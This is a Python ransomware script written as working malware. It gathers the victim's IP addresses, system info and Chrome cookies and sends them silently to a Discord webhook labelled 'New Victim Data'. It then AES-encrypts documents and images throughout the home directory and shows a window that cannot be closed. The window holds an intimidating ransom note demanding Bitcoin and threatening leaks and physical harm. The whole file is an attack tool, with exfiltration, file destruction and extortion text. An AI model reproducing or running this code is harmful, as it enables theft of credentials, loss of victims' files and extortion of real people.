import os
import random
import string
import requests
import json
import browsercookie
import psutil
import socket
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
import base64
import shutil
import tkinter as tk
from tkinter import messagebox

# Hardcoded decryption key
DECRYPTION_KEY = "mango380%".ljust(32)[:32].encode('utf-8')  # Ensure key is 32 bytes for AES-256
WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE"  # Replace with actual webhook URL

# Polymorphic code generation: Randomize variable names and junk code
def generate_random_string(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))

def insert_junk_code():
    junk_snippets = [
        "x = 0; for i in range(100): x += i",
        "useless_var = ' '.join(['a'] * 10)",
        "temp = [i for i in range(50) if i % 2 == 0]"
    ]
    return random.choice(junk_snippets)

# Data exfiltration: Harvest sensitive data
def harvest_data():
    data = {}
    # Get IP address (Private IP)
    try:
        private_ip = socket.gethostbyname(socket.gethostname())
        data['private_ip'] = private_ip
    except:
        data['private_ip'] = "Unable to retrieve Private IP"
    # Get Public IP
    try:
        public_ip = requests.get('https://api.ipify.org').text
        data['public_ip'] = public_ip
    except:
        data['public_ip'] = "Unable to retrieve Public IP"
    # Get system info
    try:
        data['system_info'] = {
            'cpu': psutil.cpu_percent(),
            'memory': psutil.virtual_memory().percent,
            'os': os.name
        }
    except:
        data['system_info'] = "Unable to retrieve system info"
    # Extract browser cookies (for Chrome, Firefox, etc.)
    try:
        cj = browsercookie.chrome()  # Requires browsercookie library
        cookies = []
        for cookie in cj:
            cookies.append({
                'name': cookie.name,
                'value': cookie.value,
                'domain': cookie.domain
            })
        data['cookies'] = cookies[:10]  # Limit to 10 for brevity
    except:
        data['cookies'] = "Unable to retrieve cookies"
    # Placeholder for passwords (real-world would involve keyloggers or credential dumping)
    data['passwords'] = "Sample password data (placeholder)"
    return data

# Send harvested data to Discord webhook
def send_to_webhook(data):
    payload = {
        'content': f"**New Victim Data**\n```json\n{json.dumps(data, indent=2)}\n```"
    }
    try:
        requests.post(WEBHOOK_URL, json=payload)
    except:
        pass  # Fail silently to avoid detection

# AES Encryption function
def encrypt_file(file_path):
    try:
        # Generate a random IV (Initialization Vector) for CBC mode
        iv = get_random_bytes(AES.block_size)
        cipher = AES.new(DECRYPTION_KEY, AES.MODE_CBC, iv)
        # Read file content
        with open(file_path, 'rb') as f:
            plaintext = f.read()
        # Pad the data to match block size
        padded_data = pad(plaintext, AES.block_size)
        encrypted_data = cipher.encrypt(padded_data)
        # Write IV + encrypted data back to file
        with open(file_path, 'wb') as f:
            f.write(iv + encrypted_data)
        return True
    except:
        return False

# AES Decryption function
def decrypt_file(file_path):
    try:
        # Read the IV and encrypted data from the file
        with open(file_path, 'rb') as f:
            iv = f.read(AES.block_size)  # First 16 bytes are the IV
            encrypted_data = f.read()    # Rest is the encrypted content
        
        # Create cipher object with the same key and IV
        cipher = AES.new(DECRYPTION_KEY, AES.MODE_CBC, iv)
        # Decrypt the data
        padded_data = cipher.decrypt(encrypted_data)
        # Unpad the decrypted data
        plaintext = unpad(padded_data, AES.block_size)
        # Write the decrypted content back to the file
        with open(file_path, 'wb') as f:
            f.write(plaintext)
        return True
    except:
        return False

# Traverse directories and encrypt files
def encrypt_files():
    target_extensions = ['.txt', '.doc', '.docx', '.pdf', '.jpg', '.png']
    for root, dirs, files in os.walk(os.path.expanduser("~")):
        # Polymorphic junk code insertion
        exec(insert_junk_code())
        for file in files:
            if any(file.endswith(ext) for ext in target_extensions):
                file_path = os.path.join(root, file)
                try:
                    encrypt_file(file_path)
                except:
                    continue

# Traverse directories and decrypt files
def decrypt_files():
    target_extensions = ['.txt', '.doc', '.docx', '.pdf', '.jpg', '.png']
    for root, dirs, files in os.walk(os.path.expanduser("~")):
        for file in files:
            if any(file.endswith(ext) for ext in target_extensions):
                file_path = os.path.join(root, file)
                try:
                    decrypt_file(file_path)
                except:
                    continue

# Create ransom note as a GUI dialog box with password input
def create_ransom_note(data):
    # Placeholder data (replace with real data if available)
    user_name = "Unknown User"
    user_address = "Unknown Address"
    public_ip = data.get('public_ip', 'Unknown Public IP')
    private_ip = data.get('private_ip', 'Unknown Private IP')

    # Ransom note content with fear-maximizing language
    note_content = f"""
WARNING: YOUR DEVICE HAS BEEN COMPROMISED! IMMEDIATE ACTION REQUIRED!

ATTENTION {user_name}: We have gained full access to your system located at {user_address}. Your personal information is now in our possession, and your digital life is under our control. Do not attempt to ignore or close this message—doing so will result in catastrophic consequences for you and your loved ones.

CRITICAL DATA EXPOSED:
- Public IP Address: {public_ip}
- Private IP Address: {private_ip}
- Physical Location: {user_address}

We have infiltrated your PC, and we are monitoring every move you make. Your files, photos, videos, and private communications have been extracted and are ready to be leaked to the dark web or sent directly to your family, friends, and employer. We've already captured sensitive material that could destroy your reputation in an instant. If you think this is a joke, test us—we'll release everything within 24 hours.

WHAT YOU MUST DO NOW:
1. DO NOT SHUT DOWN YOUR DEVICE OR DISCONNECT FROM THE INTERNET. Any attempt to evade us will trigger an immediate data dump.
2. PAY THE DEMANDED RANSOM OF $5,000 IN BITCOIN to the wallet address below within the next 12 hours. Failure to comply will result in the permanent exposure of your most private information and the destruction of your device with malicious software.
   - Bitcoin Wallet Address: 3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy
3. Enter the decryption password below if you have received it after payment confirmation.
   Once the correct password is confirmed, your files will be decrypted and restored.

WE KNOW WHO YOU ARE, {user_name}. WE KNOW WHERE YOU LIVE, {user_address}. This is not a game. We have operatives ready to escalate this matter physically if necessary. Every second you delay brings you closer to ruin. We are watching your screen right now—don’t even think of reaching out for help or closing this window.

ACT NOW OR FACE THE CONSEQUENCES.
Time Remaining: 11:59:59
"""

    # Create GUI window
    root = tk.Tk()
    root.title("WARNING: SYSTEM COMPROMISED")
    root.geometry("600x750")
    root.resizable(False, False)
    root.configure(bg='black')

    # Create a label with the ransom note content
    label = tk.Label(root, text=note_content, fg='red', bg='black', font=('Arial', 12, 'bold'), wraplength=550, justify='left')
    label.pack(pady=10, padx=20)

    # Add password input field
    password_label = tk.Label(root, text="Enter Decryption Password:", fg='red', bg='black', font=('Arial', 12))
    password_label.pack(pady=5)
    
    password_entry = tk.Entry(root, show='*', width=30, font=('Arial', 12))
    password_entry.pack(pady=5)

    # Function to check password and decrypt files
    def check_password():
        entered_password = password_entry.get()
        if entered_password == "mango380%":
            messagebox.showinfo("Success", "Correct password entered. Decrypting files now...")
            decrypt_files()
            messagebox.showinfo("Completed", "Files have been decrypted. Your system is now secure.")
            root.destroy()  # Close the window after successful decryption
        else:
            messagebox.showerror("Error", "Incorrect password. Try again or face the consequences.")

    # Add submit button for password entry
    submit_button = tk.Button(root, text="Submit Password", command=check_password, fg='white', bg='red', font=('Arial', 12, 'bold'))
    submit_button.pack(pady=10)

    # Disable close button to increase fear (user must force-quit or kill process unless password is correct)
    root.protocol("WM_DELETE_WINDOW", lambda: None)

    # Bring window to front and make it modal
    root.attributes('-topmost', True)
    root.update()
    root.mainloop()

# Main function with polymorphic variable names
def main():
    # Randomize variable names for each run
    temp_var1 = generate_random_string(8)
    temp_var2 = generate_random_string(8)
    
    # Step 1: Harvest sensitive data
    globals()[temp_var1] = harvest_data()
    send_to_webhook(globals()[temp_var1])
    
    # Step 2: Encrypt files
    globals()[temp_var2] = encrypt_files()
    
    # Step 3: Display ransom note in GUI with password input
    create_ransom_note(globals()[temp_var1])

if __name__ == "__main__":
    main()
